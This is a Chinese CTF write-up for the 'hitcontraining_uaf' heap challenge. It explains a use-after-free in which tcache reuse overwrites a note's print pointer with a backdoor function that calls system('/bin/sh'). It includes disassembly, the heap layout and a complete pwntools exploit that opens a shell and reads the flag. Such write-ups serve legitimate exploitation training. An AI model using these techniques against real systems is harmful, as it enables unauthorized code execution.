# Speedrun：hitcontraining_uaf

> 题型：heap UAF / tcache 重用 / 函数指针劫持  
> 目标：删除 note 后不置空 `notelist`，让新 note 的 content 落回旧 struct，改写 `print` 指针为 `magic`  
> 关键：`magic=0x8048945`；struct 8 字节；content 8 字节；tcache 0x10 LIFO

---

## 0. 一句话结论

```text
struct note {
    void (*print)(struct note *);   // offset 0x0
    char *content;                  // offset 0x4
};                                  // 8 字节

delete_note(idx):
    free(notelist[idx]->content);
    free(notelist[idx]);
    // 没有 notelist[idx] = NULL  <-- UAF 根因

add_note(size):
    struct = malloc(8);
    struct->print = print_note_content;
    struct->content = malloc(size);
    read(0, struct->content, size);
    // 从 notelist 中找第一个 NULL 槽，但删除过的槽仍非 NULL

delete(0) + delete(1) 之后，0x10 tcache:
    C1 -> D1 -> C0 -> D0

add(16):  struct = C1；content 走 0x20，不碰 0x10
add(8):   struct = D1；content = C0  <-- 旧 struct 0 被当成 content

往 content 写 p32(magic)，等价于把 C0->print 改成 magic。
notelist[0] 仍指向 C0，show(0) 调用 magic()。
```

`magic()` 里就是：

```asm
08048945 <magic>:
  ...
  8048959: lea    edx,[eax-0x1430]    ; "/bin/sh"
  8048962: call   80484a0 <system@plt>
```

所以 `show(0)` 直接变成 `system("/bin/sh")`。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn_Writeups/heap_uaf'

file hitcontraining_uaf
checksec --file=hitcontraining_uaf
nm -n hitcontraining_uaf | grep -E ' (main|add_note|del_note|print_note|print_note_content|magic)$'
objdump -d -M intel hitcontraining_uaf | sed -n '/<add_note>:/,/^$/p'
objdump -d -M intel hitcontraining_uaf | sed -n '/<del_note>:/,/^$/p'
objdump -d -M intel hitcontraining_uaf | sed -n '/<print_note>:/,/^$/p'
```

关键输出：

```text
ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped
Partial RELRO
No canary found
NX enabled
No PIE (0x8048000)
Not stripped

08048945 T magic
```

读法：

| 观察 | 策略 |
| --- | --- |
| 32 位 i386 | 指针 4 字节，struct 只有 8 字节 |
| Partial RELRO | 可改 GOT，但本题改函数指针更直接 |
| No PIE | `magic` 地址固定 |
| `magic` 存在 | 最终目标：让某个函数指针指向它 |
| delete 后不置空 | UAF，旧指针仍能被 show 使用 |
| `malloc(8)` struct | tcache 0x10 粒度的核心 |

### 1.1 `add_note`

```asm
08048626 <add_note>:
  ...
  8048667: mov    DWORD PTR [ebp-0xc],0x0    ; i = 0
  ...
  ; 找 notelist[i] == NULL
  80486c2: mov    eax,0x804a048
  80486cb: mov    eax,DWORD PTR [eax+edx*4]
  ...
  ; struct->print = print_note_content
  80486ce: lea    edx,[ebx-0x1a05]
  80486d4: mov    DWORD PTR [eax],edx

  ; read(0, &size_buf, 8); atoi
  80486eb: push   0x8
  80486f3: call   8048440 <read@plt>
  ...
  8048702: call   80484e0 <atoi@plt>

  ; struct->content = malloc(size)
  804871f: push   eax
  8048720: call   8048480 <malloc@plt>
  8048728: mov    DWORD PTR [esi+0x4],eax

  ; read(0, struct->content, size)
  8048781: push   edx
  8048785: call   8048440 <read@plt>

  ; count++
  80487a5: add    eax,0x1
  80487a8: mov    DWORD PTR [ebx+0x44],eax
```

结构：

```c
struct note {
    void (*print)(struct note *);  // +0
    char *content;                 // +4
};
```

`add_note` 会扫描 `notelist[0..4]`，找第一个空槽；但 `del_note` 没有清空 `notelist`，所以删除过的槽不会再被复用。

### 1.2 `del_note`：漏洞点

```asm
080487c5 <del_note>:
  ...
  ; 边界检查
  8048814: mov    eax,DWORD PTR [ebx+0x44]
  804881a: cmp    DWORD PTR [ebp-0xc],eax
  804881d: jl     804883b

  ; free(content)
  8048857: mov    eax,DWORD PTR [eax+0x4]
  804885e: call   8048470 <free@plt>

  ; free(struct)
  8048875: push   eax
  8048876: call   8048470 <free@plt>

  ; 打印 Success
  8048888: call   8048490 <puts@plt>
  ; 没有 notelist[idx] = NULL
```

等价 C：

```c
void del_note(int idx) {
    if (idx < 0 || idx >= count) {
        puts("Out of bound!");
        _exit(0);
    }
    if (notelist[idx]) {
        free(notelist[idx]->content);
        free(notelist[idx]);
        puts("Success");
    }
}
```

`notelist[idx]` 在 free 之后仍是悬空指针，这是 UAF 的根因。

### 1.3 `print_note`

```asm
0804886a <print_note>:
  ...
  ; 检查 index
  80488a9: mov    eax,DWORD PTR [eax*4+0x804b080]
  ...
  ; 调用 note->print(note)
  80488c0: mov    edx,DWORD PTR [eax]
  80488c2: push   eax
  80488c3: call   edx
```

所以只要把旧 struct 的 `+0` 改成 `magic`，下一次 `show(0)` 就会直接调用 `magic()`。

---

## 2. tcache 重用布局

### 2.1 两次 add

```python
add(p, 8, b"AAAA")   # 0
add(p, 8, b"BBBB")   # 1
```

每次 add 分配两个 chunk：

```text
note 0: struct C0 (0x10 chunk) + content D0 (0x10 chunk)
note 1: struct C1 (0x10 chunk) + content D1 (0x10 chunk)
```

32 位下 `malloc(8)` 实际拿到 0x10 大小的 chunk（8 字节用户区 + 8 字节 header）。

### 2.2 删除顺序

```python
delete(p, 0)
delete(p, 1)
```

`del_note` 先 free content，再 free struct：

```text
delete(0): free(D0) -> free(C0)
delete(1): free(D1) -> free(C1)

tcache[0x10] LIFO:
  C1 -> D1 -> C0 -> D0
```

### 2.3 重新分配

```python
add(p, 16, b"CCCC")   # 2
add(p, 8, p32(MAGIC)) # 3
```

`add(16)`：

- struct `malloc(8)` 取走 `C1`；
- content `malloc(16)` 请求 0x20 chunk，**不会**从 0x10 tcache 取，拿一个新 chunk。

`add(8)`：

- struct `malloc(8)` 取走 `D1`；
- content `malloc(8)` 取走 `C0` —— 也就是 note 0 的旧 struct。

此时 `notelist[0]` 仍指向 `C0`，而 `C0` 已经被当成 note 3 的 content，写入 `p32(MAGIC)` 就等于：

```text
C0->print = magic
```

### 2.4 触发

```python
show(p, 0)
```

`print_note(0)`：

```c
notelist[0]->print(notelist[0]);
// = magic(notelist[0]);
```

`magic` 不关心参数，直接 `system("/bin/sh")`。

---

## 3. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import time

context.arch = "i386"
context.log_level = "info"

BIN = "./hitcontraining_uaf"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

MAGIC = 0x8048945


def start():
    if args.LOCAL:
        ld = os.getenv("I386_LD")
        libpath = os.getenv("I386_LIBPATH")
        if ld:
            return process([ld, "--library-path", libpath, BIN])
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 14_hitcontraining_uaf_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def add(p, size, content):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"Note size :", str(size).encode())
    p.sendafter(b"Content :", content)


def delete(p, idx):
    p.sendlineafter(b"Your choice :", b"2")
    p.sendlineafter(b"Index :", str(idx).encode())


def show(p, idx):
    p.sendlineafter(b"Your choice :", b"3")
    p.sendlineafter(b"Index :", str(idx).encode())


def exploit():
    p = start()

    # A note is two allocations:
    #   struct note { void (*print)(note *); char *content; };  // 8 bytes
    # Delete frees both, but does not clear notelist[].
    add(p, 8, b"AAAA")      # 0: struct C0, content D0
    add(p, 8, b"BBBB")      # 1: struct C1, content D1

    # tcache 0x10 LIFO:
    #   delete(0) -> C0 -> D0
    #   delete(1) -> C1 -> D1 -> C0 -> D0
    delete(p, 0)
    delete(p, 1)

    # Size 16 skips the 0x10 tcache bin, so the content allocation of note 3
    # returns the dangling struct C0. Then note 3 can overwrite C0->print.
    add(p, 16, b"CCCC")     # 2: struct C1, content = fresh 0x20 chunk
    add(p, 8, p32(MAGIC))   # 3: struct D1, content = C0 (old struct 0)

    # notelist[0] still points at C0, so print_note(0) calls magic().
    show(p, 0)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
```

本地验证：

```bash
cd '/home/yfhd5/Pwn_Writeups/heap_uaf'
I386_LD=/tmp/libc32/root/usr/lib/i386-linux-gnu/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc32/root/usr/lib/i386-linux-gnu \
../.venv/bin/python 14_hitcontraining_uaf_exp.py LOCAL
```

预期：

```text
__PWNED__
```

远程：

```bash
HOST=... PORT=... python 14_hitcontraining_uaf_exp.py
# 平台要 TLS 时设置 SSL=1
```

---

## 4. 交互坑

1. **`add` 的 content 不能用 `sendlineafter`**  
   `read(0, content, size)` 按长度读；如果发 `sendline`，多出来的 `\n` 会留在菜单里，导致下一次 choice 解析错位。  
   用 `sendafter(b"Content :", content)`。

2. **删除后 `notelist` 不置空**  
   这是 UAF 的核心，不是 bug 之外的意外。不要在 exp 里假设 `notelist[0] == NULL`。

3. **`add(16)` 是为了跳过 0x10 tcache**  
   32 位 `malloc(8)` 是 0x10 chunk；`malloc(16)` 是 0x20 chunk，不会消耗 0x10 tcache。  
   如果第二步也 `add(8)`，content 会取走 D0，打不到 C0。

4. **tcache LIFO 顺序要背下来**  
   `delete(0)` -> `C0 -> D0`；`delete(1)` -> `C1 -> D1 -> C0 -> D0`。  
   所以 `add(16)` 的 struct 拿 C1，`add(8)` 的 struct 拿 D1，content 才轮到 C0。

5. **`magic` 是 `system("/bin/sh")`**  
   不是 `print_note_content`。`show(0)` 会跳到 `magic`，而不是打印内容。

6. **`p32(MAGIC)` 只写 4 字节**  
   content 大小是 8，但 struct 的 `print` 指针只有 4 字节；写 4 字节就够，后面 `content` 字段保持原值也无所谓。

7. **索引边界是 0..4**  
   `add_note` 最多 5 个 note；本题只用 0..3，不会越界。

8. **本机 glibc 2.43 与题目 glibc 2.23 的 tcache 行为**  
   2.23 没有 tcache，但 fastbin 的 LIFO 行为对这一套布局同样成立。  
   本机验证用 2.43 的 tcache；远程如果是 2.23，顺序一致。

9. **`Partial RELRO` 不需要改 GOT**  
   改函数指针比改 GOT 更短、更稳；不要被“Partial RELRO”带偏。

---

## 5. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec` + `nm`：32 位、No PIE、有 `magic` |
| 0:20–0:45 | `objdump add/del/print`：struct 8 字节，delete 不置空 |
| 0:45–1:05 | `add(8)` ×2，`delete(0)`、`delete(1)` 构造 tcache |
| 1:05–1:25 | `add(16)` 跳过 0x10，`add(8, p32(magic))` 覆写 C0->print |
| 1:25–1:40 | `show(0)` 调 `magic`，`__PWNED__` |
| 1:40–2:00 | 打远程，`cat flag*` |

---

## 6. 题型识别卡

```text
32 位 + No PIE + 有 system("/bin/sh") 后门
+ note 结构 = { print 函数指针, content 指针 }
+ delete 只 free、不清空全局数组
= UAF：用 tcache/fastbin LIFO 让新 content 落回旧 struct，改写 print 为 magic
```

一句话：**`add(8)` ×2 → `delete(0)`、`delete(1)` → `add(16)` 跳过 0x10 → `add(8, p32(magic))` → `show(0)`。**

